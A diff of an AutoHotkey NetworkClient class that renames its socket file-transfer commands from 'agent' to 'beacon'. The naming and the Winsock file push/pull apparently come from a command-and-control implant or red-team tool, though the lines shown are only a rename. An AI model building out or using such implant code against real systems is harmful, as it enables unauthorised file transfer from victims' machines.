@@ -349,7 +349,7 @@ class NetworkClient {
         
         try {
             ; Initial request 
-            message := Format("to_agent|{}", filename)
+            message := Format("to_beacon|{}", filename)
             this.Log("Sending file request: " message)
             
             ; Send the request and get file data
@@ -470,9 +470,9 @@ class NetworkClient {
             
             SplitPath(filepath, &filename)
             
-            ; First send the from_agent command and wait for READY response
-            message := Format("from_agent|{}", filename)
-            this.Log("Sending initial from_agent command: " message)
+            ; First send the from_beacon command and wait for READY response
+            message := Format("from_beacon|{}", filename)
+            this.Log("Sending initial from_beacon command: " message)
             
             ; Create new socket for file transfer
             transfer_socket := DllCall("Ws2_32\socket", 
